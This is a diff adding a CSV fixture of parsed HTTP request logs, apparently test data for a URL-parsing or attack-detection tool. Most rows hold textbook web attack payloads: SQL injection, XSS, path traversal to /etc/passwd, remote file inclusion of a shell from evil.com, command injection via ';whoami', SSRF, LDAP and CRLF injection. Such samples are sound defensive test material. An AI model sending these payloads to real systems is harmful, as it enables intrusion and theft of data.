@@ -1,0 +1,16 @@
+source_ip,timestamp,raw_url,scheme,host,port,effective_port,path,path_segments,path_depth,query_string,query_params,query_param_count,fragment,file_extension,method,status_code,user_agent,referrer,source
+192.168.1.10,2026-04-08T10:01:12,/login?id=1 OR 1=1--,http,,,80,/login,login,1,id=1%20OR%201%3D1--,id=1 OR 1=1--,1,,,GET,,,,ipdr
+192.168.1.11,2026-04-08T10:02:45,/search?q=<script>alert(1)</script>,http,,,80,/search,search,1,q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,q=<script>alert(1)</script>,1,,,GET,,,,ipdr
+192.168.1.12,2026-04-08T10:03:21,/download?file=../../etc/passwd,http,,,80,/download,download,1,file=..%2F..%2Fetc%2Fpasswd,file=../../etc/passwd,1,,,GET,,,,ipdr
+192.168.1.13,2026-04-08T10:04:55,/index.php?page=../../etc/passwd,http,,,80,/index.php,index.php,1,page=..%2F..%2Fetc%2Fpasswd,page=../../etc/passwd,1,,php,GET,,,,ipdr
+192.168.1.14,2026-04-08T10:05:30,/index.php?page=http://evil.com/shell.php,http,,,80,/index.php,index.php,1,page=http%3A%2F%2Fevil.com%2Fshell.php,page=http://evil.com/shell.php,1,,php,GET,,,,ipdr
+192.168.1.15,2026-04-08T10:06:10,/ping?ip=127.0.0.1;whoami,http,,,80,/ping,ping,1,ip=127.0.0.1%3Bwhoami,ip=127.0.0.1;whoami,1,,,GET,,,,ipdr
+192.168.1.16,2026-04-08T10:07:05,/fetch?url=http://127.0.0.1/admin,http,,,80,/fetch,fetch,1,url=http%3A%2F%2F127.0.0.1%2Fadmin,url=http://127.0.0.1/admin,1,,,GET,,,,ipdr
+192.168.1.17,2026-04-08T10:08:22,/xml,http,,,80,/xml,xml,1,,,0,,,POST,,,,ipdr
+192.168.1.18,2026-04-08T10:09:40,/login?user=*)(|(user=*)),http,,,80,/login,login,1,user=%2A%29%28%7C%28user%3D%2A%29%29,user=*)(|(user=*)),1,,,GET,,,,ipdr
+192.168.1.19,2026-04-08T10:10:12,/page?name=abc%0d%0aSet-Cookie:malicious=true,http,,,80,/page,page,1,name=abc%0D%0ASet-Cookie%3Amalicious%3Dtrue,"name=abc
+Set-Cookie:malicious=true",1,,,GET,,,,ipdr
+192.168.1.20,2026-04-08T10:11:55,/login,http,,,80,/login,login,1,,,0,,,POST,,,,ipdr
+192.168.1.21,2026-04-08T10:12:30,/transfer,http,,,80,/transfer,transfer,1,,,0,,,POST,,,,ipdr
+192.168.1.22,2026-04-08T10:13:10,/api,http,,,80,/api,api,1,,,0,,,GET,,,,ipdr
+192.168.1.23,2026-04-08T10:14:05,/home,http,,,80,/home,home,1,,,0,,,GET,,,,ipdr
